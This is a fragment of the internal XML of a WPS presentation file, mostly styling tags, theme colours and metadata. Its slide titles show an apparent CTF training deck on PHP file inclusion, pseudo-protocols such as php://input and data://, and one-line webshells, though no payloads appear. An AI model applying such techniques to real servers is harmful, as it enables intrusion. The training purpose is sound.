val="[[{&quot;text_align&quot;:&quot;lm&quot;,&quot;text_direction&quot;:&quot;horizontal&quot;,&quot;support_big_font&quot;:true,&quot;fill_id&quot;:&quot;89881773e3c341c1ab689e24c79864c5&quot;,&quot;fill_align&quot;:&quot;lm&quot;,&quot;chip_types&quot;:[&quot;text&quot;,&quot;header&quot;]},{&quot;text_align&quot;:&quot;lm&quot;,&quot;text_direction&quot;:&quot;horizontal&quot;,&quot;support_big_font&quot;:true,&quot;fill_id&quot;:&quot;7358526a601f4bc69a33a53d7bc8b819&quot;,&quot;fill_align&quot;:&quot;lm&quot;,&quot;chip_types&quot;:[&quot;diagram&quot;,&quot;pictext&quot;,&quot;text&quot;,&quot;picture&quot;,&quot;chart&quot;,&quot;table&quot;,&quot;video&quot;]}]]"/>
  <p:tag name="KSO_WM_SLIDE_BACKGROUND" val="[&quot;general&quot;]"/>
  <p:tag name="KSO_WM_CHIP_XID" val="5efd969281ee359a788b1dd8"/>
  <p:tag name="KSO_WM_CHIP_DECFILLPROP" val="[]"/>
  <p:tag name="KSO_WM_CHIP_GROUPID" val="5efd969281ee359a788b1dd7"/>
  <p:tag name="KSO_WM_SLIDE_BACKGROUND_TYPE" val="general"/>
  <p:tag name="KSO_WM_SLIDE_SUPPORT_FEATURE_TYPE" val="0"/>
  <p:tag name="KSO_WM_TEMPLATE_ASSEMBLE_XID" val="60656e944054ed1e2fb7fc07"/>
  <p:tag name="KSO_WM_TEMPLATE_ASSEMBLE_GROUPID" val="60656e944054ed1e2fb7fc07"/>
  <p:tag name="KSO_WM_SLIDE_LAYOUT_INFO" val="{&quot;backgroundInfo&quot;:[{&quot;bottom&quot;:0,&quot;bottomAbs&quot;:false,&quot;left&quot;:0,&quot;leftAbs&quot;:false,&quot;right&quot;:0,&quot;rightAbs&quot;:false,&quot;top&quot;:0,&quot;topAbs&quot;:false,&quot;type&quot;:&quot;general&quot;}],&quot;id&quot;:&quot;2021-04-01T15:08:00&quot;,&quot;maxSize&quot;:{&quot;size1&quot;:42.2},&quot;minSize&quot;:{&quot;size1&quot;:31.2},&quot;normalSize&quot;:{&quot;size1&quot;:34.75537037037037},&quot;subLayout&quot;:[{&quot;id&quot;:&quot;2021-04-01T15:08:00&quot;,&quot;margin&quot;:{&quot;bottom&quot;:0.02600000612437725,&quot;left&quot;:3.457000255584717,&quot;right&quot;:3.315999984741211,&quot;top&quot;:2.117000102996826},&quot;type&quot;:0},{&quot;id&quot;:&quot;2021-04-01T15:08:00&quot;,&quot;margin&quot;:{&quot;bottom&quot;:2.5399999618530273,&quot;left&quot;:3.38700008392334,&quot;right&quot;:3.385999917984009,&quot;top&quot;:1.6670000553131104},&quot;type&quot;:0}],&quot;type&quot;:0}"/>
</p:tagLst>
</file>

<file path=ppt/tags/tag348.xml><?xml version="1.0" encoding="utf-8"?>
<p:tagLst xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main">
  <p:tag name="KSO_WM_BEAUTIFY_FLAG" val="#wm#"/>
  <p:tag name="KSO_WM_TEMPLATE_CATEGORY" val="diagram"/>
  <p:tag name="KSO_WM_TEMPLATE_INDEX" val="20213570"/>
</p:tagLst>
</file>

<file path=ppt/tags/tag349.xml><?xml version="1.0" encoding="utf-8"?>
<p:tagLst xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main">
  <p:tag name="KSO_WM_BEAUTIFY_FLAG" val="#wm#"/>
  <p:tag name="KSO_WM_TEMPLATE_CATEGORY" val="diagram"/>
  <p:tag name="KSO_WM_TEMPLATE_INDEX" val="20213570"/>
</p:tagLst>
</file>

<file path=ppt/tags/tag350.xml><?xml version="1.0" encoding="utf-8"?>
<p:tagLst xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main">
  <p:tag name="KSO_WM_BEAUTIFY_FLAG" val="#wm#"/>
  <p:tag name="KSO_WM_TEMPLATE_CATEGORY" val="diagram"/>
  <p:tag name="KSO_WM_TEMPLATE_INDEX" val="20213570"/>
</p:tagLst>
</file>

<file path=ppt/tags/tag351.xml><?xml version="1.0" encoding="utf-8"?>
<p:tagLst xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main">
  <p:tag name="KSO_WM_BEAUTIFY_FLAG" val="#wm#"/>
  <p:tag name="KSO_WM_TEMPLATE_CATEGORY" val="diagram"/>
  <p:tag name="KSO_WM_TEMPLATE_INDEX" val="20213570"/>
</p:tagLst>
</file>

<file path=ppt/tags/tag352.xml><?xml version="1.0" encoding="utf-8"?>
<p:tagLst xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main">
  <p:tag name="KSO_WM_BEAUTIFY_FLAG" val="#wm#"/>
  <p:tag name="KSO_WM_TEMPLATE_CATEGORY" val="diagram"/>
  <p:tag name="KSO_WM_TEMPLATE_INDEX" val="20213570"/>
</p:tagLst>
</file>

<file path=ppt/tags/tag353.xml><?xml version="1.0" encoding="utf-8"?>
<p:tagLst xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main">
  <p:tag name="KSO_WM_BEAUTIFY_FLAG" val="#wm#"/>
  <p:tag name="KSO_WM_TEMPLATE_CATEGORY" val="diagram"/>
  <p:tag name="KSO_WM_TEMPLATE_INDEX" val="20213570"/>
</p:tagLst>
</file>

<file path=ppt/tags/tag354.xml><?xml version="1.0" encoding="utf-8"?>
<p:tagLst xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main">
  <p:tag name="KSO_WM_BEAUTIFY_FLAG" val="#wm#"/>
  <p:tag name="KSO_WM_TEMPLATE_CATEGORY" val="diagram"/>
  <p:tag name="KSO_WM_TEMPLATE_INDEX" val="20213570"/>
</p:tagLst>
</file>

<file path=ppt/tags/tag355.xml><?xml version="1.0" encoding="utf-8"?>
<p:tagLst xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main">
  <p:tag name="KSO_WM_BEAUTIFY_FLAG" val="#wm#"/>
  <p:tag name="KSO_WM_TEMPLATE_CATEGORY" val="diagram"/>
  <p:tag name="KSO_WM_TEMPLATE_INDEX" val="20213570"/>
</p:tagLst>
</file>

<file path=ppt/tags/tag356.xml><?xml version="1.0" encoding="utf-8"?>
<p:tagLst xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main">
  <p:tag name="KSO_WM_BEAUTIFY_FLAG" val="#wm#"/>
  <p:tag name="KSO_WM_TEMPLATE_CATEGORY" val="diagram"/>
  <p:tag name="KSO_WM_TEMPLATE_INDEX" val="20213570"/>
</p:tagLst>
</file>

<file path=ppt/tags/tag357.xml><?xml version="1.0" encoding="utf-8"?>
<p:tagLst xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main">
  <p:tag name="KSO_WM_BEAUTIFY_FLAG" val="#wm#"/>
  <p:tag name="KSO_WM_TEMPLATE_CATEGORY" val="diagram"/>
  <p:tag name="KSO_WM_TEMPLATE_INDEX" val="20213570"/>
</p:tagLst>
</file>

<file path=ppt/tags/tag358.xml><?xml version="1.0" encoding="utf-8"?>
<p:tagLst xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main">
  <p:tag name="KSO_WM_BEAUTIFY_FLAG" val="#wm#"/>
  <p:tag name="KSO_WM_TEMPLATE_CATEGORY" val="diagram"/>
  <p:tag name="KSO_WM_TEMPLATE_INDEX" val="20213570"/>
</p:tagLst>
</file>

<file path=ppt/tags/tag359.xml><?xml version="1.0" encoding="utf-8"?>
<p:tagLst xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main">
  <p:tag name="KSO_WPP_MARK_KEY" val="eeb99f88-86f1-42a9-b4ef-3f56f17c84d2"/>
  <p:tag name="COMMONDATA" val="eyJoZGlkIjoiODYwNzA4MDUwNjkwZjJlYjU5YWQxYmJhZGQzNDQwNW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ysClr val="windowText" lastClr="000000"/>
      </a:dk1>
      <a:lt1>
        <a:sysClr val="window" lastClr="FFFFFF"/>
      </a:lt1>
      <a:dk2>
        <a:srgbClr val="ECEDEF"/>
      </a:dk2>
      <a:lt2>
        <a:srgbClr val="FFFFFF"/>
      </a:lt2>
      <a:accent1>
        <a:srgbClr val="79B1E3"/>
      </a:accent1>
      <a:accent2>
        <a:srgbClr val="8EA6D9"/>
      </a:accent2>
      <a:accent3>
        <a:srgbClr val="A39BCF"/>
      </a:accent3>
      <a:accent4>
        <a:srgbClr val="B98FC5"/>
      </a:accent4>
      <a:accent5>
        <a:srgbClr val="CE84BB"/>
      </a:accent5>
      <a:accent6>
        <a:srgbClr val="E379B1"/>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5913</Words>
  <Application>WPS 演示</Application>
  <PresentationFormat>宽屏</PresentationFormat>
  <Paragraphs>274</Paragraphs>
  <Slides>39</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39</vt:i4>
      </vt:variant>
    </vt:vector>
  </HeadingPairs>
  <TitlesOfParts>
    <vt:vector size="51" baseType="lpstr">
      <vt:lpstr>Arial</vt:lpstr>
      <vt:lpstr>宋体</vt:lpstr>
      <vt:lpstr>Wingdings</vt:lpstr>
      <vt:lpstr>微软雅黑</vt:lpstr>
      <vt:lpstr>黑体</vt:lpstr>
      <vt:lpstr>Segoe UI</vt:lpstr>
      <vt:lpstr>微软雅黑 Light</vt:lpstr>
      <vt:lpstr>Arial Unicode MS</vt:lpstr>
      <vt:lpstr>Calibri</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php支持的伪协议</vt:lpstr>
      <vt:lpstr>PowerPoint 演示文稿</vt:lpstr>
      <vt:lpstr>PowerPoint 演示文稿</vt:lpstr>
      <vt:lpstr>[ACTF2020 新生赛]Include 1 buu</vt:lpstr>
      <vt:lpstr>2 data://</vt:lpstr>
      <vt:lpstr>web78</vt:lpstr>
      <vt:lpstr>3 file://</vt:lpstr>
      <vt:lpstr>4 php://</vt:lpstr>
      <vt:lpstr>5 php://input</vt:lpstr>
      <vt:lpstr>PowerPoint 演示文稿</vt:lpstr>
      <vt:lpstr>6 zip://</vt:lpstr>
      <vt:lpstr>PowerPoint 演示文稿</vt:lpstr>
      <vt:lpstr>通常php.ini的位置在：       /etc目录下或/usr/local/lib目录下。</vt:lpstr>
      <vt:lpstr>PowerPoint 演示文稿</vt:lpstr>
      <vt:lpstr>PowerPoint 演示文稿</vt:lpstr>
      <vt:lpstr>PowerPoint 演示文稿</vt:lpstr>
      <vt:lpstr>PowerPoint 演示文稿</vt:lpstr>
      <vt:lpstr>PowerPoint 演示文稿</vt:lpstr>
      <vt:lpstr>PowerPoint 演示文稿</vt:lpstr>
      <vt:lpstr>一句话木马</vt:lpstr>
      <vt:lpstr>其他一句话木马</vt:lpstr>
      <vt:lpstr>js前端验证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文同学</dc:creator>
  <cp:lastModifiedBy>陈爱江</cp:lastModifiedBy>
  <cp:revision>62</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2023-07-04T10:33:00Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2024-11-08T16:52:10Z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398022FEDE6D4503B51B34B7EFA977AB_12</vt:lpwstr>
  </property>
  <property fmtid="{D5CDD505-2E9C-101B-9397-08002B2CF9AE}" pid="3" name="KSOProductBuildVer">
    <vt:lpwstr>2052-11.1.0.14252</vt:lpwstr>
  </property>
</Properties>
</file>